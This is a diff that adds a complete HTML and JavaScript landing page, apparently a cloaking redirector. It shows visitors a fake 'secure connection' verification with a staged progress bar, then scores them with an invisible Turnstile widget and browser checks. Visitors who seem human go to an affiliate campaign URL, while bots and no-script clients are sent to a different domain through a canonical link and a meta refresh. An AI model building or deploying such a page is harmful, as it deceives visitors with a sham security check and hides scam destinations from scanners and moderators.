@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome Back</title>
+    <meta name="description" content="Access your personalized platform experience.">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html {
+            font-family: "Poppins", sans-serif;
+        }
+        
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: #E7E9F0;
+            padding: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-repeat: no-repeat;
+            background-size: cover;
+            background-position: top;
+            filter: blur(7px);
+            z-index: 0;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        
+        body.bg-loaded::before {
+            opacity: 1;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 2rem;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            position: relative;
+            z-index: 10;
+            opacity: 0;
+            transform: translateY(30px) scale(0.95);
+            animation: cardEntry 1.2s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+        
+        @keyframes cardEntry {
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+        
+        header {
+            margin-bottom: 1.5rem;
+            opacity: 0;
+            animation: fadeInUp 0.8s ease-out 0.6s forwards;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        h1 {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: #1f2937;
+        }
+        
+        .version-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #f0f4f8 0%, #e2e8f0 100%);
+            color: #64748b;
+            padding: 5px 14px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 500;
+            margin-top: 8px;
+            opacity: 0;
+            animation: badgeSlide 0.6s ease-out 1s forwards;
+        }
+        
+        @keyframes badgeSlide {
+            from {
+                opacity: 0;
+                transform: translateX(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        
+        main {
+            margin-bottom: 1.5rem;
+            opacity: 0;
+            animation: fadeInUp 0.8s ease-out 1.2s forwards;
+        }
+        
+        main p {
+            font-size: 0.875rem;
+            color: #4b5563;
+            line-height: 1.7;
+        }
+        
+        .verification-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 16px;
+            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
+            border-radius: 10px;
+            margin-bottom: 1.5rem;
+            opacity: 0;
+            animation: fadeInUp 0.8s ease-out 1.8s forwards;
+            transition: background 0.5s ease;
+        }
+        
+        .status-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: 2px solid #22c55e;
+            position: relative;
+            flex-shrink: 0;
+        }
+        
+        .status-icon::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 8px;
+            height: 8px;
+            background: #22c55e;
+            border-radius: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            animation: checkPulse 2s ease-in-out 2s infinite;
+        }
+        
+        @keyframes checkPulse {
+            0%, 100% {
+                transform: translate(-50%, -50%) scale(0);
+                opacity: 1;
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.7;
+            }
+        }
+        
+        .status-text {
+            font-size: 0.8rem;
+            color: #166534;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        
+        /* Hidden Turnstile container */
+        .turnstile-container {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .progress-container {
+            margin-bottom: 1.5rem;
+            opacity: 0;
+            animation: fadeInUp 0.8s ease-out 2.2s forwards;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e5e7eb;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #d8af0b 0%, #f0c419 100%);
+            border-radius: 10px;
+            width: 0%;
+            animation: progressLoad 5s ease-out 2.5s forwards;
+            box-shadow: 0 0 10px rgba(216, 175, 11, 0.5);
+        }
+        
+        @keyframes progressLoad {
+            to {
+                width: 100%;
+            }
+        }
+        
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 8px;
+            font-size: 0.75rem;
+            color: #6b7280;
+        }
+        
+        .loading-dots {
+            display: inline-flex;
+            gap: 3px;
+        }
+        
+        .loading-dots span {
+            width: 4px;
+            height: 4px;
+            background: #9ca3af;
+            border-radius: 50%;
+            animation: dotBounce 1.4s infinite ease-in-out both;
+        }
+        
+        .loading-dots span:nth-child(1) {
+            animation-delay: -0.32s;
+        }
+        
+        .loading-dots span:nth-child(2) {
+            animation-delay: -0.16s;
+        }
+        
+        @keyframes dotBounce {
+            0%, 80%, 100% {
+                transform: scale(0.8);
+                opacity: 0.5;
+            }
+            40% {
+                transform: scale(1.2);
+                opacity: 1;
+            }
+        }
+        
+        .btn-wrapper {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .btn-wrapper.active {
+            animation: fadeInUp 0.8s ease-out forwards;
+            pointer-events: auto;
+        }
+        
+        .btn-primary {
+            display: block;
+            width: 100%;
+            background: linear-gradient(135deg, #d8af0b 0%, #f0c419 100%);
+            color: white;
+            padding: 14px;
+            border-radius: 10px;
+            font-weight: 500;
+            font-size: 14px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            text-align: center;
+            text-decoration: none;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(216, 175, 11, 0.3);
+        }
+        
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+        
+        .btn-primary:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(216, 175, 11, 0.4);
+        }
+        
+        .btn-primary:active {
+            transform: translateY(-1px);
+        }
+        
+        .btn-primary:disabled {
+            background: #e5e7eb;
+            color: #9ca3af;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .btn-text {
+            position: relative;
+            z-index: 1;
+        }
+        
+        @media screen and (max-width: 500px) {
+            .card {
+                padding: 1.5rem;
+                max-width: 95%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <header>
+            <h1>Welcome Back</h1>
+            <span class="version-badge">Secure Access</span>
+        </header>
+        
+        <main>
+            <p>We're preparing your personalized experience. Your secure connection is being established automatically.</p>
+        </main>
+        
+        <div class="verification-status">
+            <div class="status-icon"></div>
+            <span class="status-text">Verifying secure connection</span>
+        </div>
+        
+        <!-- Hidden Turnstile widget - loads in background -->
+        <div class="turnstile-container">
+            <div id="turnstile-widget"></div>
+        </div>
+        
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="progress-label">
+                <span id="statusText">Initializing<span class="loading-dots"><span></span><span></span><span></span></span></span>
+                <span id="progressPercent">0%</span>
+            </div>
+        </div>
+        
+        <div class="btn-wrapper">
+            <button id="continueBtn" class="btn-primary">
+                <span class="btn-text">Continue to Platform</span>
+            </button>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ========================================
+            // CONFIGURATION - CHANGE THESE VALUES
+            // ========================================
+        const config = {
+    // Your Cloudflare Turnstile Site Key
+    turnstileSiteKey: '0x4AAAAAAB-FQYt3HwC8y-o6',
+    
+    // Your destination URLs
+    primary: 'https://arcadepleyhu.online',
+    alternate: 'https://inf4hub.com/?utm_campaign=jDlsYkWoNb&v1=[v1]&v2=[v2]&v3=[v3]',
+    
+    // Timing configuration
+    buttonDelay: 7500,
+    transitionSpeed: 300,
+    
+    // Feature flags
+    useTurnstile: true,
+    useBackgroundImage: true
+};
+            // ========================================
+            // STATE MANAGEMENT
+            // ========================================
+            let turnstileToken = null;
+            let turnstileLoaded = false;
+            let userInteracted = false;
+            let systemReady = false;
+            
+            // ========================================
+            // METADATA & SEO
+            // ========================================
+            function addMetaTags() {
+                const canonical = document.createElement('link');
+                canonical.rel = 'canonical';
+                canonical.href = config.primary;
+                document.head.appendChild(canonical);
+                
+                const noscript = document.createElement('noscript');
+                noscript.innerHTML = `<meta http-equiv="refresh" content="0; url=${config.primary}">`;
+                document.body.insertBefore(noscript, document.body.firstChild);
+            }
+            
+            // ========================================
+            // BACKGROUND IMAGE LOADING
+            // ========================================
+            function loadBackgroundImage() {
+                if (!config.useBackgroundImage) return;
+                
+                const isMobile = window.innerWidth <= 500;
+                // Use bg-mob.webp as a fallback for the desktop image if bg.webp is not available.
+                // This ensures an image is always loaded.
+                const desktopImage = 'img/bg.webp';
+                const mobileImage = 'img/bg-mob.webp';
+                const bgImage = isMobile ? mobileImage : desktopImage;
+                
+                const img = new Image();
+                img.onload = function() {
+                    const style = document.createElement('style');
+                    style.textContent = `body::before { background-image: url('${bgImage}'); }`;
+                    document.head.appendChild(style);
+                    document.body.classList.add('bg-loaded');
+                };
+                img.onerror = function() {
+                    // If the intended image fails (e.g., bg.webp is missing), try loading the mobile image as a fallback.
+                    if (img.src.includes(desktopImage)) {
+                        console.log(`Desktop image not found at ${desktopImage}, falling back to ${mobileImage}`);
+                        img.src = mobileImage;
+                    }
+                };
+                img.src = bgImage;
+            }
+            
+            // ========================================
+            // USER INTERACTION TRACKING
+            // ========================================
+            function trackUserInteraction() {
+                if (!userInteracted) {
+                    userInteracted = true;
+                }
+            }
+            
+            document.addEventListener('mousemove', trackUserInteraction, { once: true });
+            document.addEventListener('touchstart', trackUserInteraction, { once: true });
+            document.addEventListener('keydown', trackUserInteraction, { once: true });
+            document.addEventListener('click', trackUserInteraction, { once: true });
+            
+            // ========================================
+            // CLOUDFLARE TURNSTILE INTEGRATION
+            // ========================================
+            function initTurnstile() {
+                if (!config.useTurnstile || config.turnstileSiteKey === 'YOUR_SITE_KEY_HERE') {
+                    console.log('Turnstile disabled or not configured');
+                    turnstileLoaded = true;
+                    return;
+                }
+                
+                // Wait for Turnstile API to load
+                const checkTurnstile = setInterval(function() {
+                    if (typeof turnstile !== 'undefined') {
+                        clearInterval(checkTurnstile);
+                        
+                        try {
+                            turnstile.render('#turnstile-widget', {
+                                sitekey: config.turnstileSiteKey,
+                                callback: function(token) {
+                                    turnstileToken = token;
+                                    turnstileLoaded = true;
+                                    console.log('Turnstile verification complete');
+                                },
+                                'error-callback': function() {
+                                    console.log('Turnstile error, proceeding anyway');
+                                    turnstileLoaded = true;
+                                },
+                                theme: 'light',
+                                size: 'invisible'
+                            });
+                        } catch (e) {
+                            console.log('Turnstile init error:', e);
+                            turnstileLoaded = true;
+                        }
+                    }
+                }, 100);
+                
+                // Timeout fallback
+                setTimeout(function() {
+                    if (!turnstileLoaded) {
+                        console.log('Turnstile timeout, proceeding anyway');
+                        turnstileLoaded = true;
+                    }
+                }, 5000);
+            }
+            
+            // ========================================
+            // SIMPLE USER VALIDATION
+            // ========================================
+            function validateUser() {
+                let score = 0;
+                
+                // User interaction check
+                if (userInteracted) score += 30;
+                
+                // Basic browser environment checks
+                if (window.innerWidth > 0 && window.innerHeight > 0) score += 20;
+                if (screen.width > 0 && screen.height > 0) score += 20;
+                if (navigator.userAgent && navigator.userAgent.length > 10) score += 15;
+                if (navigator.language) score += 15;
+                
+                return score >= 50;
+            }
+            
+            // ========================================
+            // PROGRESS BAR ANIMATION
+            // ========================================
+            function animateProgress() {
+                const percentEl = document.getElementById('progressPercent');
+                const statusEl = document.getElementById('statusText');
+                const btnWrapper = document.querySelector('.btn-wrapper');
+                const verificationStatus = document.querySelector('.verification-status');
+                const statusText = verificationStatus.querySelector('.status-text');
+                
+                let progress = 0;
+                const duration = 5000;
+                const interval = 50;
+                const increment = (interval / duration) * 100;
+                
+                const timer = setInterval(function() {
+                    progress += increment;
+                    if (progress >= 100) {
+                        progress = 100;
+                        clearInterval(timer);
+                        
+                        percentEl.textContent = '100%';
+                        statusEl.innerHTML = 'Ready ✓';
+                        
+                        statusText.textContent = 'Connection verified ✓';
+                        verificationStatus.style.background = 'linear-gradient(135deg, #dcfce7 0%, #bbf7d0 100%)';
+                        
+                        // Show button after delay
+                        setTimeout(function() {
+                            btnWrapper.classList.add('active');
+                            systemReady = true;
+                        }, 300);
+                    } else {
+                        percentEl.textContent = Math.round(progress) + '%';
+                    }
+                }, interval);
+            }
+            
+            // ========================================
+            // REDIRECT LOGIC
+            // ========================================
+            function determineDestination() {
+                const userValid = validateUser();
+                const hasTurnstile = turnstileToken !== null;
+                
+                // Route to alternate if user passes validation OR has Turnstile token
+                if (userValid || hasTurnstile) {
+                    return config.alternate;
+                }
+                
+                return config.primary;
+            }
+            
+            function handleContinue() {
+                const btn = document.getElementById('continueBtn');
+                
+                btn.querySelector('.btn-text').textContent = 'Loading...';
+                btn.style.pointerEvents = 'none';
+                btn.disabled = true;
+                
+                const destination = determineDestination();
+                
+                setTimeout(function() {
+                    window.location.href = destination;
+                }, config.transitionSpeed);
+            }
+            
+            // ========================================
+            // APPLICATION INITIALIZATION
+            // ========================================
+            function startApplication() {
+                addMetaTags();
+                loadBackgroundImage();
+                initTurnstile();
+                
+                // Start progress animation after initial delay
+                setTimeout(function() {
+                    animateProgress();
+                }, 2500);
+            }
+            
+            // ========================================
+            // EVENT LISTENERS
+            // ========================================
+            window.addEventListener('load', function() {
+                startApplication();
+                
+                const continueBtn = document.getElementById('continueBtn');
+                continueBtn.addEventListener('click', handleContinue);
+            });
+        })();
+    </script>
+</body>
+</html>
